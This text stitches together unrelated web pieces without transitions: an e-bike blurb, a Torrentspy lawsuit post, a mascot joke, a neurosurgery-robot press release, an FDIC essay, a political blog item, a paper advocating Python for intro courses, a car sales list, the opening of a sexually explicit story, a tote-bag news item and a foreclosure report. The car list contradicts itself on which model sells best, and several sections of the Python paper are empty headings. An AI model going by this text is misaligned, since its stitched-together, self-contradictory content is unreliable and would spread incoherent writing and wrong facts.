Electric - assist bicycles were finally legalized in Ontario in the fall of 2006 thanks to years of effort by committed activists .
These vehicles provide an energy - efficient , cost - effective , low - noise , zero-emissions transportation solution that does not contribute to urban sprawl .
They could help to reduce traffic congestion , especially if integrated into the public transit mix with free , secure lock - ups at transit stations and sufficient carry support ( e.g. , OC Transpo ’s Rack ’n’ Roll equipment ) for long journey ’s where the bike is wanted at both ends of the transit network .
It ’s time to stop wishing for miracles , and start making positive changes based on what we know today .
It ’s time to stop waiting for leadership and start providing it .

Torrentspy , one of the biggest BitTorrent search engines , filed a " motion to dismiss " the lawsuit initiated by the MPAA a month ago .
Torrentspy is accused of " supporting " copyright infringement .
However , torrentspy reacted to these accusations saying that everything they do , Google can do to ... and even better .
In the motion to dismiss ( coralized pdf ) Torrentspy states :
“ everything alleged about defendants ’ website ( torrentspy ) is true about Google , and even more so , because Google outperforms the allegations in the complaint .
Plaintiffs ’ ( MPAA ) factually empty and broadbrush categorical accusations are like mud that covers all distinctions . ”
This is absolutely true , just try the “ filetype: torrent ” command and Google helps you to find all the copyrighted stuff you need .
Moreover , torrentspy always removes links to copyrighted material if the copyright owners ask them to , try that at google !
Torrentspy restructured their directory listing just a couple of days after the complaint was filed by the MPAA .
They removed the ( possibly infringement promoting ? ? ) categories like DVD - screener , Telecine and Cam and replaced it with a more general “ video ” category .
Officially this change was to make navigating through the site easier , but in fact it makes it harder .
However , it ’s probably a wise step with a possible lawsuit on the way .
and yes … it has a name .
GeoDuck is the name of the worst college mascot ever .. period and the honor goes to Evergreen State College in Olympia , WA
According to their Athletics page ,
The geoduck is mollusk native to the Pacific Northwest .
The geoduck ( pronounced “ GOO - ee - duck ” ) is the largest burrowing clam in the world , weighing in at anywhere from one to three pounds at maturity .
The appearance of geoduck ’s large , protruding siphon has led to the belief that the geoduck has the properties of an aphrodisiac .
The geoduck has a life expectancy of up to 150 years with the oldest recorded at 163 years .
Oh , there is a GeoDuck fight song too ..
I hope they do n’t have a Football team there .
Go , Geoducks go ,
Through the mud and the sand ,
let ’s go .
Siphon high , squirt it out ,
swivel all about ,
let it all hang out .
Go , Geoducks go ,
Stretch your necks when the tide
is low
Siphon high , squirt it out ,
swivel all about ,
let it all hang out .
Ok .. ok I wo n’t hold it off much longer .. here goes the GeoDuck , the worst College Mascot EVER ….
What do you guys think ?
Have you seen worse ?
Post it down below in the comments section .
Until then you can poke fun at Evergreen ’s athletic page for GeoDuck
Surgery is about to change with the introduction of a new surgical robotic system at the University of Calgary / Calgary Health Region .
NeuroArm aims to revolutionize neurosurgery and other branches of operative medicine by liberating them from the constraints of the human hand .
The world 's first MRI - compatible surgical robot , unveiled today , is the creation of neurosurgeon Dr. Garnette Sutherland and his team .
Dr. Sutherland has spent the last six years leading a team of Canadian scientists , in cooperation with MacDonald , Dettwiler and Associates Ltd. ( MDA ) , to design a machine " that represents a milestone in medical technology . "
" Many of our microsurgical techniques evolved in the 1960s , and have pushed surgeons to the limits of their precision , accuracy , dexterity and stamina , " says Dr. Sutherland , professor of neurosurgery , University of Calgary Faculty of Medicine and the Calgary Health Region .
" NeuroArm dramatically enhances the spatial resolution at which surgeons operate , and shifts surgery from the organ towards the cell level . "
Designed to be controlled by a surgeon from a computer workstation , neuroArm operates in conjunction with real - time MR imaging , providing surgeons unprecedented detail and control , enabling them to manipulate tools at a microscopic scale .
Advanced surgical testing of neuroArm is currently underway , followed by the first patient , anticipated for this summer .
" The launch of neuroArm places the U of C and the Calgary Health Region at the forefront of the emerging field of biomedical engineering , and establishes Canada 's leadership role in image - guided robotic surgery , " says U of C President Harvey Weingarten , PhD .
" The Calgary Health Region considers the introduction of the neuroArm an historic moment in our ability to provide unprecedented care and safety to patients in Alberta , " says the Calgary Health Region 's Chief Executive Officer and President Jack Davis .
" We are extremely proud to be a partner in neuroArm and to have worked with such a dedicated team of individuals and funding partners . "
NeuroArm , one of the most advanced robotic systems ever developed , was designed and built in collaboration with MDA , known for creating Canadarm and Canadarm2 .
Bringing neuroArm to life required a unique partnership between medicine , engineering , physics , and education ; some of Calgary 's most visionary philanthropists ; the high - tech sector , and numerous government agencies and research funding organizations .
" This unprecedented collaboration is a direct result of Calgary 's optimistic and entrepreneurial community spirit , " says Dr. Sutherland .
" It 's no accident a project like this is coming out of Calgary .
Our community believes in innovation and supporting challenging projects . "

" This is truly a flagship program for the University of Calgary and all the partner agencies involved , " says Weingarten .
" Visioning and building neuroArm required unprecedented collaboration between numerous government departments , funding agencies and the private sector .
Making this a reality will have impacts and benefits we can't even anticipate as Calgary and Canada become known as world leaders in the field of robotic surgery . "
The project began in 2001 when the namesakes of the Seaman Family MR Research Centre , Calgary philanthropists , oilpatch pioneers and brothers Doc , B.J. and Don Seaman provided $ 2 million to begin planning neuroArm .
Their contribution was a natural extension of their support for the research centre that began with the development of the world 's first intraoperative MRI scanner based on a movable high - field magnet .
" As engineers , the technology involved in neuroArm intrigued us from the start .
We really understood the challenges and appreciated the brilliance that had to go into it , " Doc Seaman says .
The family realized that a project like neuroArm would place Calgary on the leading - edge of surgery worldwide .
" The best surgeons in the world can work within an eighth of an inch .
NeuroArm makes it possible for surgeons to work accurately within the width of a hair , " Doc Seaman says .
" This will put us on the world stage and will help attract more top people in medicine and surgery , which will benefit the university and the community as a whole . "
" This is a shining example of Canadian science making breakthroughs that will improve quality of life for people in Canada and around the globe , " says President and CEO of the Canada Foundation for Innovation Dr. Eliot Phillipson .
" This world - class project will further develop Canada 's international reputation as a place where outstanding research is being conducted . "
" Our mission is to be a leader in health and a partner in care .
Patient care and safety are always our number one priority , " says Davis .
" We are thrilled that the neuroArm will improve recovery and wait times for patients , and most of all , improve their quality of life following surgery so they can get back to daily life activities . "

The Seaman family 's donation , combined with funding from Western Economic Diversification Canada , allowed for detailed planning and design of the project .
That set the stage for substantial support from the Canada Foundation for Innovation , the National Research Council of Canada , Alberta Advanced Education and Technology , Alberta Heritage Foundation for Medical Research and additional philanthropists to build the one - of - a- kind machine and create a comprehensive medical robotics program .
A global search for robotics expertise led Sutherland to MDA , a perfect fit for neuroArm because of the company 's background in creating specialized space robots , used aboard NASA space shuttles and the International Space Station .
" NeuroArm is a great fit for us , allowing us to apply our world - renowned space solutions to medical applications that will benefit patients here on Earth , " says Bruce Mack , vice - president of development programs of MDA 's Brampton operations .
" The combination of our remote operation and sensory information expertise , coupled with our manipulation technologies , will enable improved decision making and performance in the operating theatre . "
Developing neuroArm required an international collaboration of health professionals , physicists , electrical , software , optical and mechanical engineers to build a robot capable of operating safely in a surgical suite and within the strong magnetic field of the intraoperative MRI environment .
" Building a robot is complex to begin with .
Adding the constraints of operating in a sterile operating room , within an MRI machine and alongside the other people involved in surgery makes it a very complex environment , " says the project 's robotics engineer Alex Greer .
By acquiring first - hand knowledge of the demands in the operating room , Greer and Paul McBeth , the first U of C neuroArm robotics engineer , acted as the bridge between the physicians , scientists and engineers involved in the project .
" Doctors and engineers are good at what they do but they speak different languages , " Greer says .
" Translating surgical requirements into technical terms can be a challenge . "
When the project began , engineers from MDA traveled to Calgary and worked with surgeons for several weeks to define the requirements necessary for the successful design of neuroArm .
Sutherland 's team is developing specialized training programs in partnership with the Calgary Health Region , and U of C's faculties of medicine and education to train surgeons in the use of neuroArm .
Many other surgical disciplines have and continue to participate in applying neuroArm to various types of surgical procedures .
" We 're not just building a robot , we 're building a medical robotics program , " Dr. Sutherland says .
" We want the neuroArm technology to be translated into the global community , i.e. hospitals around the world , " he says .
" To accomplish this , we will need our students and young professionals because they 're the powerhouse when it comes to embracing new technology and applying it to clinical care . "
Federal Deposit Insurance ( FDIC )
by Kent M. Pitman ( Monday , June 6 , 2005 )
The real way to protect " the little guy " is to make the FDIC protect $ 100,000 or $ 130,000 or even $ 500,000 per person rather than per account .
It 's true that the multiplicative effect you cite scales , but what does n't scale is the availability of enough funds for the little guy to fill more than one of these accounts .
If rich people ( for pretty much any value of rich you want to draw ) have to self - insure above a certain amount per-person ( rather than per-account ) , it would more than pay for the ability to extend more protection to the poor .
The idea that FDIC has no per-person upper bound means that rich people are protected when they keep large amounts of cash in the bank , which I think is not a necessary service of government .
Fixing the FDIC
Every citizen should be protected directly for some amount of their savings in any qualified bank , let 's say $ 200 K .
I say directly because it would not be the institution that would be insured , it would be them personally .
Instead of institutions being " FDIC insured " , they would be " FDIC qualified " , indicating that the FDIC considered them to be an appropriate risk for consumers to be placing their money there , and is willing to pay to cover losses against the direct insurance if such an institution goes bust .
Any citizen who has less than the protected amount deposited in FDIC insured institutions signs a notice with their bank confirming this fact .
The FDIC must report the amount of the deposit and a tax - id number , and can cross - check retroactively that this was not violated before paying on a premium .
If a citizen has more than $ 200 K deposited , they may either elect to spread their protection generally across their money , such that no loss may cut into that base $ 200 K , or they may designate a specific portion of their money to be protected and the other portion to not be protected .
So if I have $ 300 K in one bank and $ 150 K in another bank , and the smaller bank went bankrupt , I would lose all $ 150 K because I still had $ 300 K remaining unless I specifically had designated that the $ 150 K was protected from that account and only $ 50 K from the other account .
In that case , if the larger bank went bankrupt , I would lose $ 250 K .
Most people would probably want the blanket coverage , but some people might not .
I add this option mostly for completeness because I do n't really think it hurts things as long as the FDIC is doing a fairly good job of approving only reputable banks in the first place .
There should be special protection ( either special insurance , or a requirement to give back money recently acquired if bankruptcy is about to occur , as sometimes happens for other expenses recently occurred ) for the case I heard someone on C - SPAN cite today where someone sells a house , deposits the check , and then the next day the bank is out of business .
That 's just a weird case that it can't be very expensive for the government to insure against specially .
Making that be a justification as to why people need huge lines of protection does n't make sense .
Allow the person to safely cash any such large check once a year ( to avoid people getting extra insurance by constantly moving money ) and then to distribute the funds within a rational period of time ( perhaps 2 - 3 months ) .
This is critically important since in the modern world one cannot just walk in and get that much cash to hold themselves - they are veritably forced to put the money in a bank by present day banking laws , especially lately with the Patriot Act trying to track where such large amounts of money go .
Rationale
This proposal has the following good effects :
You never know which direction Chris Matthews is headed on any given day , but today he slammed Rep.
Jack Kingston 's phony war propaganda comparisons after Chris asked him how long we 'll have troops in Iraq .

Can someone fill it in ? )
Matthews :
Will the people of Georgia support ten more years of American involvement , military involvement in Iraq ?
Kingston :
Well , people know we 're still in Germany and in South Korea ...
Matthews : Yea , but .. no no no no no .
I wo n't let you get away with that .
That 's not a fair comparison .
We do not have a war in South Korea .
There 's no German that 's fired on an American since 1945 .
That 's not a fair comparison ... That is not an acceptable argument !
These comparisons to previous eras ... it 's lazy thinking , Congressman .
It 's the kind of propaganda that does not help this country understand the situation .
You stepped into a dishonest comparison .
Some people come on this show over and over again saying things that - JUST - are n 't - true .
A common right wing talking point is that the US still has troops in South Korea and Germany --- so what 's the big deal with a huge military presence in Iraq - - even if it 's forevah ?
Now if we can get Matthews to break through and call more people out on this then he 'll be onto something .
It 's one thing to call out Kingston , but another to call out Giuliani or McCain .
And frankly , any Democratic nominee as well .

Abstract
Currently , there is little consensus about which programming language is most appropriate for introductory computer science classes .
Most schools use a traditional system programming language such as C , C++ , Java , or Ada in CS1 and CS2 .
However , scripting languages such as Tcl , Perl and Python are becoming increasingly popular software development tools .
This article discusses the advantages of using a scripting language as the first language in the computer science curriculum .
Scripting languages are simpler , safer and more flexible than system languages .
Python in particular emerges as a near ideal candidate for a first programming language .
1 Introduction
Some have suggested that the ``language wars ' ' are over and the ( only ) reasonable choices are : C , C++ , Java , Ada ( and maybe Eiffel ) . ( [ footnote ]
This seemed to be the consensus of the panel discussion ``Possible Futures for CS2 '' at SIGCSE '98 . )
I believe declaring the wars over is admitting defeat too soon .
A time when there is little consensus on a single first language seems the appropriate time to go back to first principles and consider what a first language should be .
Along the way , we might discover that some of the best candidates have not even been considered .
In this paper , I argue that very high - level scripting languages such as Python , Perl , Tcl , Rexx , and Visual Basic are better candidates for a first language .
One in particular , Python , seems nearly ideal .
2 Criteria for a First Language
2.1 Assumptions about CS1 and CS2
First , the CS1 / CS2 sequence is fundamentally about computer programming .
While these courses certainly address broader issues of computer science theory and practice , the core of computer science and of these first classes is still problem - solving , design , and programming .
Learning to program is very much a hands - on activity , and these classes involve design and programming projects of various sizes in either open - or closed - lab settings .
Second , the programming language per se is not the focus of these classes .
While our students often refer to these classes as ``the C++ class '' or ``the Java class , '' the courses are designed to provide an introduction to the field of computer science .
The language being used is really a secondary issue .
The tendency to think of CS1 as being an introduction to a particular language is a symptom of the complexity of the languages that are often used .
Third , these classes introduce students to the primary paradigms for design and problem solving in use today , namely structured and object - oriented methods implemented in an imperative ( statement - oriented ) language .
While there are strong advocates for other approaches ( e.g. using a functional language in the first class ) , the vast majority of introductory classes tend to follow the more traditional path .
Fourth , and perhaps most controversial , I assume that the goal of CS1 is to engage and educate computer science majors and , perhaps , recruit new ones .
Given the current demand for our graduates and the need for all educated individuals to understand information technology , it is a major disservice to consider CS1 as a ``weedout '' class .
Programming is hard , but we should strive to make it no harder than it needs to be .
2.2 Implications for Programming Language Choice
The hands - on , experimental nature of the introductory courses also has implications for the choice of language .
A language that allows designs to be expressed with minimal overhead encourages experimentation and rewriting .
Therefore , the language should be very high - level and flexible , enabling students to quickly and easily experiment with alternative designs .
This facilitates thinking about algorithm and design issues rather than low - level implementation details .
To the extent possible , the language should also provide safety for experimentation .
We should favor languages that guard against mysterious crashes from pointer or array - bounds errors .
Students at this level are just learning techniques for tracking down and fixing errors ; the language should help them learn , not frustrate them .
It is also important that the language support modern approaches to design involving abstraction , encapsulation and object - oriented techniques .
While object - based designs can be implemented in any language , doing so in a language that supports objects is much more intuitive and straightforward .
Again , this allows the course to focus on higher - level conceptual issues rather than implementation details .
Finally , there are practical considerations in choosing a language .
It is highly desirable that the language be widely available on a variety of platforms .
Similarly , a language that is used by practitioners outside of academia is preferable to a language that is for ``teaching only , '' provided it meets the other criteria discussed above .
Teaching language X simply because it is a commonly used language should not be an important consideration by itself .
Our students will learn and use many languages during their careers .
What is important in the first courses is giving them the best possible foundation of core principles and techniques that will allow them to adopt and adapt to the various languages they will confront in the ``real world . ''
3 The Python Advantage
3.1 The Case for Scripting Languages
... several recent trends , such as faster machines , better scripting languages , the increasing importance of graphical user interfaces and component architectures , and the growth of the Internet , have greatly increased the applicability of scripting languages .
These trends will continue over the next decade with more and more new applications written entirely in scripting languages and system programming languages used primarily for creating components .
Traditionally , computer science programs have emphasized system programming languages over scripting languages .
However , scripting languages would seem to offer a number of benefits , particularly for the introductory programming sequence .
Scripting languages generally have simpler syntax and semantics than system languages .
Because of dynamic typing and interpretation they are very flexible and encourage experimentation .
The very high - level nature allows students to build more sophisticated and interesting projects with less implementation effort .
Probably , the lack of interest in scripting languages has stemmed from the perception that they are ``toy '' languages and not suited to general purpose programming .
While that may have been true of early scripting languages ( e.g. Unix shell scripts ) , it is certainly not true of modern variants .
3.2 A Little Bit of Python
3.2.1 Python is simple
if ( x < 0 ) cout << " x was negative " ; x = -x ;
In Python the corresponding code executes as expected , since the indentation itself determines the block :
if x < 0 : print " x was negative " x = -x
Python supports the use of functions and classes but does not force it .
Simple programs really are simple .
For example , consider the ubiquitous ``Hello World ' ' program in Python :
print " Hello World ! "
C++ requires this program to be wrapped in a function and preceded by a preprocessor directive :
#include < iostream .h> int main ( ) { cout << " Hello World ! " ; }
In Java , the situation is even worse , as all code must be inside of a class :
public class helloWorld { public static void main ( String [ ] args ) { System.out.println ( " Hello World ! " ) ; } }
Semantically , Python is also simple .
Python is dynamically typed , so there is no need for variable declarations .
This reduces the amount of code that students have to write and also eliminates common errors stemming from misunderstanding the subtle distinctions of declaration , definition and use .
For example , students in C++ and Java often ``accidently '' redeclare variables where they really only want to use them ( typing int count = 0 ; when they mean count = 0 ) .
Such mistakes can be hard to track down .
Python has a minimal but complete set of simple control structures : one selection construct ( if - elif - else ) , one definite loop ( for ) and one indefinite loop ( while ) .
Python also has a modern exception handling mechanism similar to that found in C++ and Java .
Unlike Java , however , you do not have to understand the exception mechanism to write simple programs .
From a pedagogical perspective , Python 's for loop is illustrative .
It allows a control variable to take on successive values in a sequence .
It can be used to iterate through any sequence such as a list ( array ) or string .
For example , the items in a list can be printed as follows :
for item in List : print item
The range operation produces a sequence of numbers in a given range .
For example , range ( 5 ) produces the list [ 0,1,2,3,4 ] .
This can be used to provide numerically - controlled loops .
The previous code could have been written ( less clearly ) as :
for i in range ( len ( List ) ) : print List [i ]
for
Python has a simple uniform data model .
Variables are always references to heap allocated values ( objects ) .
The model is consistent , avoiding the confusion over heap versus automatic variables in C++ or primitive versus object types in Java .
Both of these languages require the teaching of multiple allocation models to implement even relatively simple programs .
Similarly , Python has only a single parameter passing mechanism ( by value ) .
Parameter passing is simply assignment of actual to formal parameters at call time .
Once students understand the simple assignment model , they get parameter passing for free .
3.2.2 Python is safe
3.2.3 Python supports object - oriented programming
One weakness of Python from a systems development perspective is that encapsulation is only enforced through convention .
There is no mechanism for specifying that class members are private .
Pedagogically , this does not seem to be a major weakness , since it is still possible to teach the principles of data - hiding ; it is just not enforced by the language .
The language provides an elegant mechanism but keeps it simple , avoiding the complexity of the various ``visibility modes '' that must be discussed in C++ or Java .
The dynamic typing model of Python makes it particularly convenient for discussing container classes in a data structures course .
A stack class , for example , can be used to store any type of object .
It can be an int stack , a float stack , a string stack , or a mixture of types .
This is accomplished without having to introduce generics ( templates ) or performing dynamic type casting .
Figure 1 shows an example definition of a simple bounded stack class .
class Stack : def __init__ ( self , size ) : self.data = [ None ] * size self.size = 0 def push ( self , item ) : self.data[self.size ] = item self .size = self.size + 1 def pop( self ) : self.size = self.size - 1 return self.data[self.size ] def is_empty ( self ) : return self. size == 0 def is_full ( self ) : return self.size == len(self.data )
Figure 1 : bstack .py -- a simple bounded stack .
Python also provides a clean module system that dynamically loads files at run-time similar to Java ( minus the cumbersome package organization restrictions ) .
This allows for easy management of modular projects ( Laird & Soraiz , 1998a ) without the need for the header files and preprocessor directives of C ++.
The implementation of stack could be used via an import statement :
from bstack import Stack my Stack = Stack ( 100 ) myStack.push ( " Hello " )
A different implementation can be substituted by simply changing the module name in the import statement .
3.2.4 Python is fun
3.2.5 Python is practical
4 Some Obstacles ( Real and Imagined )
4.1 Lack of Compile - Time Checking
Experience teaching languages like Pascal , C++ , and Java has convinced me that the supposed advantages of compile - time error checking for neophyte programmers are illusory .
First , the vast majority of errors detected by a compiler are quite pedestrian ( e.g. the ubiquitous missing " ; " ) .
A language like Python eliminates many of these common errors through a simpler syntax .
Furthermore , most remaining pure syntax errors will also be reported immediately by the Python interpreter , which analyzes the syntax of the program at load time .
Second , there is little advantage in catching more subtle errors ( e.g. type incompatibilities ) at compile time .
A common type error is caused by mismatches between declaration and use .
Many of these errors are simply errors in declaration .
In a language without declarations , these errors do not occur .
When the error is a genuine error in how a type is used , the error will still be caught in a dynamically - typed language .
The difference is that it will be caught and diagnosed at run-time .
For the types of programs typically written in the first two CS classes , compile - time checking is not much of an advantage .
The simplicity of the edit - interpret cycle far outweighs any benefit of finding multiple errors at compile time .
Compile - time checking can actually be detrimental for some students in a couple of ways .
First , it is demoralizing .
Students must have a complete syntactically correct program before they get any results .
Compiling a program and staring at a screenfull of nagging messages is a dull and exasperating activity .
With an interpreted language , at least something happens ; the program generates partial output before stopping for an error .
The student sees the program in ( partial ) action and has just one error to fix at a time .
Each fix brings more progress .
This is a much more encouraging situation .
A second detraction of extensive compile - time checking is that it gives students the illusion of thoroughness .
They believe that once a program compiles , it must be pretty much correct .
One symptom of this is inadequate testing .
Another problem is that it delays detection of design errors .
In my experience , it is not uncommon for students to invest considerable time on a program and feel they are almost done because there is just one little bug they can't figure out .
Only it turns out the one little bug is still a compile error .
Far from being ``almost done , '' the assignment is due in a couple hours and they have n't even gotten the program to compile yet !
They have not had a chance to discover major flaws in the logic of their solution .
In an interpreted language , finding errors goes hand in hand with testing ; the presence of type errors does not necessarily prevent the discovery of more serious design errors .
4.2 Scripting Languages are Too Inefficient
In any case this concern for execution efficiency is misplaced .
Beginning programmers are usually not writing production code .
Their programs generally do not have hard time constraints and will only be run a few times .
The real efficiency concern is the amount of time spent developing the program .
This is where scripting languages shine .
The fast edit / interpret cycle , absence of declarations , and the very high - level nature of scripting languages make them a perfect tool for this environment .
4.3 Students Need to Learn a System Language
The question becomes , then , which should be the language of the first class ( es ) ?
One argument for teaching a language like C++ , Java or Ada in the first class is that these languages themselves are so complex and difficult that students need to start learning them right away in order to have enough time to master them .
This argument gets it backwards .
The first classes should not be about language , but rather about computer science and , fundamentally , design .
Trying to teach a complex language inherently detracts from that goal , since students must spend more time mastering the language and , hence , less time mastering other material .
This is the reason some educators are looking at Java as a simpler alternative to C++ , but even Java is very complex compared to Python .
A more sensible approach is to teach design first , starting students with a simple but powerful language .
With a solid grasp of programming and design it is much easier to understand concepts such as static typing , visibility , generics and polymorphism .
As a thought experiment , imagine really explaining the meaning of each part of the helloWorld Java program to a novice programmer .
Imagine how much easier it would be to explain public , class , static , void , and String [ ] , to a student who already understands functions , classes , instance variables , class variables , data types and arrays .
The more complicated constructs of system languages ( e.g. C++ templates , virtual methods , dynamic casts ) are really mechanisms for achieving some of the flexibility provided by dynamic languages inside a statically typed framework .
Why not teach the concepts first in a language that does not require such complexity to express them ?
A sophomore - level principles of programming languages class or a systems programming class seems a more appropriate place to tackle the intricacies of a system language .
4.4 Python is Unfamiliar
4.5 Our Students Want Language X
4.6 There Are n't any Textbooks
This article is a wake - up call for those who are considering a switch to Java .
If you might be switching languages , carefully consider the motives for your switch .
Pedagogical considerations argue for a move away from system languages to scripting languages , and Python is a very good choice .
What is needed is a few stout souls to take the plunge with Python and develop the appropriate materials .
Perhaps some current authors might be also be persuaded to develop Python versions of popular texts .
4.7 What About Scheme ?
The weakness of Scheme is that it is perceived as a marginal language that is quite different from the system languages that are used elsewhere in the curriculum .
This has limited its popularity in CS1 .
Python offers many of the advantages of Scheme while still being similar to languages such as C++ , Java , and Ada , thus easing the transition to those languages .
For those wishing to explore multiple programming paradigms in the first courses , Python has support for the functional style including first - order functions , map , apply , lambda and closures .
5 Conclusions
One of the major precepts we try to instill in our students is the idea of using the proper tool for a given job .
If a client came to me and suggested she needed a program written in a very short time frame , that the program had no tight time or memory constraints , and that once completed it would only be run a few times , I would immediately suggest a scripting language as the appropriate tool .
These are exactly the conditions under which programming occurs in most CS1 and CS2 classes .
Given the existence of scripting languages such as Python that also provide good support for modular and object - oriented program design , there is no good reason for not using them .
Scripting languages are the most appropriate tool for our introductory courses .
Given the current lack of consensus on a single first language , it seems like the ideal time to begin a movement to scripting languages .
Consider using Python in your introductory classes .

Top 5 World ’s Most Successful Cars Ever
Featured

Filed under :on
09/01/2006
Success in car industry is measured only through results of sale , although in the last decade this criterion started to lose value as well .
Increased competition and lowered profitability resulted in continuous losses per sold car recorded by the leading car makers .
It was caused by multiple reasons – from expensive labor and costs of restructuring to manufacturing deficiencies caused by trying to present the whole range of new cars as soon as possible , which inevitably led to many withdrawals and expensive corrections of the cars .
Still , some cars gained the buyers ’ trust all around the world .
Different generations of cars such as Toyota Corolla , Volkswagen Golf or Honda Civic became more and more popular and sold in higher quantities .
5. Ford Model T
With 16,500,000 sold cars , T model is the second best selling car in the world , but also much more than that .
This is the first car manufactured by the so called assembly line manufacturing , which simplified the car making , and more importantly , made it cheaper and started more massive production .
The famous line of the founder Henry Ford refers to T model : “ Any customer can have a car painted any color that he wants so long as it is black ” since , due to express production , no other color could dry as fast as black .

Volkswagen Beetle –
By far the best selling car in the world with the same body for almost 60 years
Volkswagen ’s Beetle is the best selling car in history .
Legend has it that Adolf Hitler himself drew its legendary shape on a paper towel .
During almost 60 years , the incredible 21,529,464 Beetles were produced , which is particularly significant when taking into account the fact that during 60 years the Beetle had the same car body , with some mechanical changes .
The original form of the Beetle was produced until 2003 , when the last car left the Volkswagen factory in Mexico .
3. Volkswagen Golf

Although ultra popular in Europe , Volkswagen ’s Golf is lower ranked on the most important market , the North American one
Third ranked is second of two Volkswagens - Golf , which gained in popularity on a global scale through five generations , and to the present more than 24 million cars have been sold .
The latest Volkswagen generation will once more try to win the American market , and its advantage is the fact that the American buyers are more and more oriented towards buying more cost - effective cars .
Golf has been produced since 1974 , and its sports GTI version recently celebrated its 30th birthday .
2. Ford - F series
Click to enlarge
Believe it or not , every year the F Ford model is sold more than any other car
It is almost unbelievable that the second ranked in total sale is a pick - up vehicle .
Even more impressive information is that this vehicle reached such a score only on North American territory .
However , the most surprising is the fact that Ford ’s F series is at present the best selling car in the world .
Every year Ford sells almost a million cars , that is almost one vehicle every 30 seconds .
So far , 25 million vehicles of the F series were sold .
1. Toyota Corolla

Toyota Corolla is the best - selling nameplate in automotive history
The making of Corolla started in 1966 when Japanese manufacturer decided to present a small compact car which integrates quality , style and cost - effectiveness of more prestigious models .
During 40 years Corolla had as many as nine generations , and in 1997 it was the best selling car of all time .
To the present day more than 35 million vehicles were sold and we can expect it to stay on the top in the future .

My first BBC and I ’m Hooked .
It was the summer after graduation and my boyfriend at the time Todd was heading off to college for the fall and I became very lonely and depressed at the time .
I stayed in the house for a few weeks and barely talked to any of my friends .
I was so lonely and bored and just wanted to get my mind off of Todd and how he ’s prob gonna be fucking every sexy blonde that looks like me while he ’s there .
I knew I had to get out of the house before I went crazy lol .
That ’s when Labor Day weekend came and I decided to take my girlfriend up on her offer to go out to a party with her .
I had been stuck in the house for weeks and besides I needed something to take my mind of off things and Todd .
When she came over to pick me up she told me she had a surprise guy she wanted to fix up me .
I was nervous and excited at the same time .
It had been so long since I had been fucked and I could n’t help but think about Todd and all the girls he was probably fucking while off at school .

First there was the It Bag designed by Anya Hindmarch with the slogan : " I'm Not A Plastic Bag , " which caused a stampede .
Now an alternative version , with the words :
" I'm Not A Smug Twat , " emblazoned across it , is proving a hit .
The £ 5 Hindmarch version went on sale at Sainsbury 's last week , prompting customers to queue for hours to own the " greener " alternative to a plastic bag .
But it has attracted controversy after it was revealed it was manufactured in China .
Marissa Vanderzee has created her alternative version because she was sick of the growing obsession with designer handbags .
Miss Vanderzee , 31 , said : " The whole fad bag thing annoys me .
They 're generally hugely overpriced and the whole idea of having a ' must - have ' or ' it ' item is ridiculous .
" This ecological bag thing is just a fad .
I guess it 's ironic that my bags are becoming a bit of a ' must - have ' item - albeit on a minor scale . "
Initially , Miss Vanderzee , who comes from California but has lived in Shoreditch since 2002 , made three bags for a joke , but now she is receiving 10 orders a day .
She sells them for £ 15 at stalls in Brick Lane market , Tower Hamlets , and Broadway Market , Hackney .
She said : " I came up with the idea when I saw reports of people queuing at Sainsbury's .
" I do n't understand why anyone would want to queue for hours just to get their hands on a bag .
It seems crazy . "
She said it was a " great shame " that the Hindmarch bags had been made using Chinese labour .
Typically , workers in the Chinese garment industry are paid between 20 p and 30 p an hour and there are concerns that the cotton used has been picked by child labour .
Miss Vanderzee said : " They 're supposed to be ethical and yet it turns out they 're exploiting people .
My bag might be a bit more expensive but the only cheap labour I 'm exploiting is me .
" I also support local sourcing and production .
" My fabrics are sourced in Northern Ireland , England and Italy , while they are produced in London and Wales . "
Sainsbury 's has defended the Hindmarch bag .
A spokesman said : " While the bag is made in China it is not manufactured with cheap labour nor does it exploit local workers .
" The factory pays double the minimum wage for that province and works with an international human rights consultant . "

NEW YORK ( CNNMoney.com ) --
Foreclosures are devastating communities across the United States , and the impact may only worsen as more subprime adjustable mortgages reset during the next few months .
Foreclosure filings are up 35 percent nationwide since a year ago , according to RealtyTrac .
Allegheny County foreclosure maps show that foreclosed homes ( black dots ) can be found in low - income areas ( dark blue ) , high - income areas ( pale yellow ) and everywhere in between .
A Colorado street filled with foreclosed - on houses
Even in prosperous Sunbelt places like Pima County , Ariz. , which includes Tucson , foreclosures climbed 51 percent in just two years .
Maryellen Hayden , executive director of the Pittsburgh office of the Association of Community Organizations for Reform Now ( ACORN ) , reports that foreclosures have skyrocketed in Allegheny County from 1,287 in 1996 to 4,944 in 2006 .
In Slavic Village , a working - class Cleveland neighborhood of about 11,000 homes , 600 of them are vacant and boarded up , according to City Councilman Tony Branchatelli .
" Foreclosures have helped destabilize not only Cleveland neighborhoods but inner ring suburbs like Shaker Heights and Euclid as well , " said Jim Rokakis , treasurer of Cuyahoga County , which includes Cleveland , one of the hardest - hit U.S. cities .
And the worst may be yet to come .
Rokakis said Cuyahoga County is on track for 16,000 foreclosures this year , up from about 3,500 annually in Cleveland during the mid-1990s .
The impact can reach far beyond the affected homeowners .
Rokakis says streets lined with foreclosures look like " mouths with teeth knocked out of them . "
In places like Slavic Village , according to Branchatelli , you can't go down a single street without seeing at least one vacant house .
On some Pittsburgh streets , reports Hayden , every fifth or sixth house is boarded up .
Dan Immergluck , associate professor of city and regional planning at Georgia Tech , said that for every foreclosure within an eighth of a mile of a house - two and a half city blocks in every direction - the home 's value drops by about 1 percent .
The vacancies look bad enough , but it's what happens next that really hurts .
" The bad people in a community find out right away when a house has been foreclosed on , " said Hayden .
" They come in and steal the copper plumbing .
I 've even seen them strip the aluminum siding off to sell .
The houses become havens for drug dealers . "
Fighting those problems off , stabilizing the community and redeveloping blighted areas are a challenge for cash - starved municipalities .
And they have less money to pay for it because foreclosures cause tax collections to suffer .
Not only do foreclosures , abandonment and demolition take properties off the tax rolls ; the remaining homeowners often want their assessments lowered and taxes cut to reflect their plummeting property values .
" More than 64,000 people in Cuyahoga County alone filed an objection to their assessments this year because their property values have dropped , " Rokakis said .
And the actual owners of the foreclosed properties - the investors who own the loans - may stop paying taxes as well .
Said Branchatelli , " They may send someone around to take a look at the place , who decides it 's not worth even going through the foreclosure process .
They may just take a powder . "
Because of unfiled paperwork in many of those cases , houses may stay in limbo for months , deteriorating further until they 're completely unsalvageable .
Rokakis himself recently experienced , secondhand , the pain of foreclosure by attending the sheriff 's auction of his boyhood home .
The outstanding balance on the mortgage was $ 85,000 but the house sold at auction for just $ 19,000 .
